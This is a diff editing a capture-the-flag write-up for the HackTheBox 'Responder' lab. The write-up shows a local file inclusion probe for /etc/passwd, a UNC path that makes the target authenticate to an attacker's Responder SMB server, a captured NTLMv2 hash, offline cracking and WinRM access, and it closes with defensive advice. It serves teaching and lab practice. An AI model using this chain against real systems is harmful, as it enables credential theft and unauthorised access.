@@ -1,4 +1,3 @@
-```markdown
 # Responder
 
 **Platform:** HackTheBox — Starting Point  
@@ -29,12 +28,10 @@ Nmap revealed two open ports — a web server on port 80 and
 WinRM on port 5985. WinRM is Windows Remote Management, a 
 legitimate Windows service that allows remote command execution 
 — essentially SSH for Windows.
-
-```
+```bash
 80/tcp   open  http     Apache httpd 2.4.52
 5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (WinRM)
 ```
-
 The web server was the primary target for initial access. WinRM 
 noted as a potential entry point once credentials are obtained.
 
@@ -43,22 +40,18 @@ noted as a potential entry point once credentials are obtained.
 ## Enumeration
 Browsed to the web application and noticed the URL contained a 
 language parameter:
-
 ```
 http://10.129.X.X/?page=french.html
 ```
-
 This pattern — a parameter that loads a file by name — is a 
 classic indicator of Local File Inclusion. The application is 
 likely reading the file from disk and including its contents 
 in the page response.
 
 Tested for LFI by attempting to load a sensitive system file:
-
 ```
 http://10.129.X.X/?page=../../../../etc/passwd
 ```
-
 The application appeared to process the request but returned 
 no useful output — likely because this is a Windows machine 
 and the path format is different, or the include is filtered.
@@ -92,19 +85,15 @@ sudo responder -I tun0
 Instead of pointing the LFI to a local file, pointed it to 
 the Responder SMB server using a UNC path. Windows will 
 automatically try to authenticate to any UNC path it encounters:
-
 ```
 http://10.129.X.X/?page=//10.10.X.X/somefile
 ```
-
 Responder immediately captured an NTLMv2 hash:
-
 ```
 [SMB] NTLMv2-SSP Client   : 10.129.X.X
 [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
 [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:abc123...
 ```
-
 **Step 3 — Crack the hash with Hashcat**
 
 Saved the hash to a file and cracked it offline:
@@ -143,13 +132,6 @@ type C:\Users\Administrator\Desktop\flag.txt
 
 ---
 
-## Flag
-```
-redacted
-```
-
----
-
 ## Key Lesson
 This machine teaches a powerful attack chain that combines three 
 separate techniques into one exploit path — LFI, NTLM hash 
@@ -178,5 +160,3 @@ file path inputs, disabling NTLM authentication where possible,
 enforcing strong password policies to resist offline cracking, 
 and monitoring for outbound SMB connections which are unusual 
 in most environments.
-
-Replace `10.129.X.X` with your target IP, `10.10.X.X` with your HTB VPN IP, and paste your real flag and cracked password. Want me to continue with Crocodile?
